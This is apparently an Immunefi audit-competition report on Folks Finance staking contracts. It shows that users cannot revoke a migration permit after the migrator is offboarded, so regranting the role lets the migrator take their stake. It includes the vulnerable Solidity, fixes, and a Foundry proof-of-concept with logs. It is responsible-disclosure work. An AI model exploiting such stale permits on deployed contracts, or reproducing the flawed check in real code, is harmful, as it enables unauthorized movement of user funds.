# 69476 sc low users cannot revoke stale migration approvals after a migrator is offboarded so old permits can silently reactivate

**Submitted on Mar 15th 2026 at 05:20:09 UTC by @Johnyfwesh for** [**Audit Comp | Folks Finance: Staking Contracts**](https://immunefi.com/audit-competition/audit-comp-folks-finance-staking-contracts)

* **Report ID:** #69476
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/interfaces/IMigratorV1.sol>
* **Impacts:**
  * Users cannot revoke

## Finding Description and Impact

[`Staking.setMigrationPermit()`](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L77-L81) uses the migrator's current role membership as a hard precondition for every write. That includes revocations: calling `setMigrationPermit(migrator, false)` reverts with `MigratorNotFound` unless the target address currently holds `MIGRATOR_ROLE`. However, the user's approval is persisted separately in [`migrationPermits`](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L36-L38) and role removal does not clear that storage.

This creates a permission-lifecycle bug during migrator rotation or incident response. A user can approve a migrator while it is active, but once the address is offboarded the same user loses the ability to revoke that old approval. The stale `true` entry remains stored indefinitely. If operations later re-grant `MIGRATOR_ROLE` to the same address, [`migratePositionsFrom()`](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L166-L172) accepts the old permit and immediately re-enables migration without fresh user consent.

That reactivation is not just cosmetic. Once re-authorized, the migrator can pull the user's remaining principal and rewards directly to itself via [`TOKEN.safeTransfer(msg.sender, ...)`](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L203-L206). This undermines the intended approval model described in [`IMigratorV1`](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/interfaces/IMigratorV1.sol#L8-L14), where migration is supposed to require current user permission.

## Affected code

* [`src/Staking.sol#L36-L38`](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L36-L38)

```solidity
StakingPeriod[] public stakingPeriods;
mapping(address user => UserStake[]) public userStakes;
mapping(address migrator => mapping(address user => bool isAuthorized)) public migrationPermits;
```

* Migration approvals are stored independently from role lifecycle. Revoking `MIGRATOR_ROLE` does not clear any existing user consent entries.
* [`src/Staking.sol#L77-L81`](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L77-L81)

```solidity
function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
    if (!hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);

    migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
    emit MigrationPermitUpdated(_migrator, msg.sender, _isMigrationPermitted);
}
```

* Grants and revocations both require the target address to currently hold `MIGRATOR_ROLE`, so users cannot clear an old permit once the migrator is offboarded.
* [`src/Staking.sol#L166-L172`](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L166-L172)

```solidity
function migratePositionsFrom(address user)
    external
    nonReentrant
    onlyRole(MIGRATOR_ROLE)
    returns (UserStake[] memory)
{
    if (!migrationPermits[msg.sender][user]) revert MigratorNotPermitted(msg.sender, user);
```

* Once the same address regains `MIGRATOR_ROLE`, the old stored `migrationPermits[msg.sender][user] == true` entry is immediately sufficient again.
* [`src/Staking.sol#L203-L206`](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L203-L206)

```solidity
activeTotalStaked -= unclaimedUserAmount;
activeTotalRewards -= unclaimedUserRewards;

TOKEN.safeTransfer(msg.sender, unclaimedUserAmount + unclaimedUserRewards);
```

* Successful migration sends the user's remaining assets directly to the migrator, so stale-approval reactivation can lead to real unauthorized asset movement.
* [`src/interfaces/IMigratorV1.sol#L8-L14`](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/interfaces/IMigratorV1.sol#L8-L14)

```solidity
/**
 *     @dev Migrator require permission from user to transfer their position to the new staking contract.
 *          (migrator should not be able to migrate stakes if not approved by user)
 */
interface IMigratorV1 is IERC165, IStakingV1 {
```

* The interface documents a consent-based security model, but stale permits can outlive role removal and revive later without renewed approval.

## Impact

Users cannot revoke migration consent during migrator offboarding. That makes role removal weaker than it appears operationally: the system may look safe while the address is deauthorized, yet an old `true` permit remains in storage waiting to reactivate if the same address is regranted. it can immediately migrate any previously approved user's active positions without asking again. Because `migratePositionsFrom()` transfers unclaimed principal and rewards to the migrator address, this can result in unauthorized custody transfer of user assets.

## Recommended mitigation steps

1. Allow `setMigrationPermit(_migrator, false)` to succeed even when `_migrator` no longer has `MIGRATOR_ROLE`; only require the role when setting a permit to `true`.
2. Invalidate or clear stored permits when `MIGRATOR_ROLE` is revoked, for example by deleting permits or advancing a per-migrator approval epoch that must match at migration time.
3. Add regression tests that cover the full lifecycle: approve, revoke role, user revokes, regrant role, and assert migration stays blocked until the user explicitly approves again.

## Proof of Concept

### PoC Test

#### Test file

`test/StaleMigrationPermitReactivation.t.sol`

```solidity
// SPDX-License-Identifier: BUSL-1.1

pragma solidity ^0.8.23;

import {IAccessControl} from "openzeppelin-contracts/contracts/access/IAccessControl.sol";
import {ERC20Permit, ERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Staking} from "../src/Staking.sol";
import {IStakingV1} from "../src/interfaces/IStakingV1.sol";

contract StaleMigrationPermitPoCToken is ERC20Permit {
    constructor() ERC20Permit("StaleMigrationPermitPoCToken") ERC20("StaleMigrationPermitPoCToken", "SMPP") {}
}

contract StaleMigrationPermitReactivationTest is Test {
    Staking internal staking;
    StaleMigrationPermitPoCToken internal token;
    bytes32 internal constant MIGRATOR_ROLE = keccak256("MIGRATOR");

    address internal admin = address(0xA11CE);
    address internal manager = address(0xB0B);
    address internal pauser = address(0xCAFE);
    address internal migrator = address(0xD00D);
    address internal alice = address(0xA71CE);

    uint256 internal constant ALICE_STAKE = 10 ether;
    uint64 internal constant STAKING_DURATION = 30 days;
    uint64 internal constant UNLOCK_DURATION = 7 days;
    uint32 internal constant APR_BPS = 1200;

    function setUp() public {
        token = new StaleMigrationPermitPoCToken();
        staking = new Staking(admin, manager, pauser, address(token));

        vm.prank(admin);
        staking.grantRole(MIGRATOR_ROLE, migrator);
    }

    function test_PoC_StaleMigrationPermitReactivatesWhenMigratorRoleReturns() public {
        uint8 periodIndex = _addStakingPeriod(ALICE_STAKE, STAKING_DURATION, UNLOCK_DURATION, APR_BPS, true);
        uint256 aliceReward = _calculateReward(ALICE_STAKE, STAKING_DURATION, APR_BPS);
        uint256 expectedMigratorPayout = ALICE_STAKE + aliceReward;

        // Phase 1: create a live position and an explicit migration approval while the migrator is active.
        deal(address(token), address(staking), aliceReward);
        deal(address(token), alice, ALICE_STAKE);

        vm.startPrank(alice);
        token.approve(address(staking), ALICE_STAKE);
        uint8 stakeIndex = staking.stake(periodIndex, ALICE_STAKE, _stakeParams());
        staking.setMigrationPermit(migrator, true);
        vm.stopPrank();

        console.log("stake index", stakeIndex);
        console.log("permit after initial approval", staking.migrationPermits(migrator, alice) ? uint256(1) : 0);
        console.log("migrator role after initial approval", staking.hasRole(MIGRATOR_ROLE, migrator) ? uint256(1) : 0);
        console.log("activeTotalStaked after stake", staking.activeTotalStaked());
        console.log("activeTotalRewards after stake", staking.activeTotalRewards());
        console.log("staking contract token balance after stake", token.balanceOf(address(staking)));

        assertEq(stakeIndex, 0);
        assertEq(staking.getUserStakes(alice).length, 1);
        assertEq(staking.migrationPermits(migrator, alice), true);

        // Phase 2: admin offboards the migrator. Alice now tries to revoke, but the contract blocks the cleanup.
        vm.prank(admin);
        staking.revokeRole(MIGRATOR_ROLE, migrator);

        console.log("migrator role after offboarding", staking.hasRole(MIGRATOR_ROLE, migrator) ? uint256(1) : 0);

        vm.expectRevert(abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, migrator));
        vm.prank(alice);
        staking.setMigrationPermit(migrator, false);

        console.log("permit after failed revoke attempt", staking.migrationPermits(migrator, alice) ? uint256(1) : 0);

        assertEq(staking.migrationPermits(migrator, alice), true);

        // Phase 3: while the role is absent, the stale permit is inert only because AccessControl blocks the call.
        vm.expectRevert(
            abi.encodeWithSelector(IAccessControl.AccessControlUnauthorizedAccount.selector, migrator, MIGRATOR_ROLE)
        );
        vm.prank(migrator);
        staking.migratePositionsFrom(alice);

        // Phase 4: if the same address regains MIGRATOR_ROLE, the old approval silently becomes valid again.
        vm.prank(admin);
        staking.grantRole(MIGRATOR_ROLE, migrator);

        console.log("migrator role after regrant", staking.hasRole(MIGRATOR_ROLE, migrator) ? uint256(1) : 0);
        console.log(
            "stale permit still stored before migration", staking.migrationPermits(migrator, alice) ? uint256(1) : 0
        );
        console.log("migrator token balance before migration", token.balanceOf(migrator));

        vm.prank(migrator);
        IStakingV1.UserStake[] memory migratedStakes = staking.migratePositionsFrom(alice);

        console.log("migrated stakes length", migratedStakes.length);
        console.log("migrator token balance after migration", token.balanceOf(migrator));
        console.log("activeTotalStaked after migration", staking.activeTotalStaked());
        console.log("activeTotalRewards after migration", staking.activeTotalRewards());
        console.log("alice stake count after migration", staking.getUserStakes(alice).length);

        assertEq(migratedStakes.length, 1);
        assertEq(migratedStakes[0].amount, ALICE_STAKE);
        assertEq(migratedStakes[0].reward, aliceReward);
        assertEq(migratedStakes[0].claimedAmount, 0);
        assertEq(migratedStakes[0].claimedReward, 0);
        assertEq(staking.migrationPermits(migrator, alice), true);
        assertEq(staking.getUserStakes(alice).length, 0);
        assertEq(staking.activeTotalStaked(), 0);
        assertEq(staking.activeTotalRewards(), 0);
        assertEq(token.balanceOf(migrator), expectedMigratorPayout);
    }

    function _addStakingPeriod(
        uint256 cap,
        uint64 stakingDurationSeconds,
        uint64 unlockDurationSeconds,
        uint32 aprBps,
        bool isActive
    ) internal returns (uint8 periodIndex) {
        vm.prank(manager);
        periodIndex = staking.addStakingPeriod(cap, stakingDurationSeconds, unlockDurationSeconds, aprBps, isActive);
    }

    function _stakeParams() internal pure returns (IStakingV1.StakeParams memory params) {
        params = IStakingV1.StakeParams({
            maxStakingDurationSeconds: STAKING_DURATION,
            maxUnlockDurationSeconds: UNLOCK_DURATION,
            minAprBps: APR_BPS,
            referrer: address(0)
        });
    }

    function _calculateReward(uint256 stakingAmount, uint256 stakingDurationSeconds, uint256 aprBps)
        internal
        pure
        returns (uint256)
    {
        return (stakingAmount * stakingDurationSeconds * aprBps) / (365 days * 10_000);
    }
}
```

### What the PoC demonstrates

1. Alice stakes and explicitly approves an active migrator.
2. Admin revokes `MIGRATOR_ROLE` from that migrator address.
3. Alice tries to clean up with `setMigrationPermit(migrator, false)` and the call reverts with `MigratorNotFound`.
4. The old `migrationPermits[migrator][alice]` value remains `true` in storage.
5. Admin grants `MIGRATOR_ROLE` back to the same address.
6. The same migrator immediately calls `migratePositionsFrom(alice)` and receives Alice's remaining stake plus reward without any fresh authorization step.

### Run

```bash
forge test --match-path test/StaleMigrationPermitReactivation.t.sol -vvv
```

### Test Results

```bash
Ran 1 test for test/StaleMigrationPermitReactivation.t.sol:StaleMigrationPermitReactivationTest
[PASS] test_PoC_StaleMigrationPermitReactivatesWhenMigratorRoleReturns() (gas: 801102)
Logs:
  stake index 0
  permit after initial approval 1
  migrator role after initial approval 1
  activeTotalStaked after stake 10000000000000000000
  activeTotalRewards after stake 98630136986301369
  staking contract token balance after stake 10098630136986301369
  migrator role after offboarding 0
  permit after failed revoke attempt 1
  migrator role after regrant 1
  stale permit still stored before migration 1
  migrator token balance before migration 0
  migrated stakes length 1
  migrator token balance after migration 10098630136986301369
  activeTotalStaked after migration 0
  activeTotalRewards after migration 0
  alice stake count after migration 0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.20ms (4.92ms CPU time)
```

The passing PoC confirms the issue end to end: Alice cannot revoke the stale approval once the migrator is offboarded, the stored permit survives role removal, and regranting the same address reactivates migration immediately without new user consent.
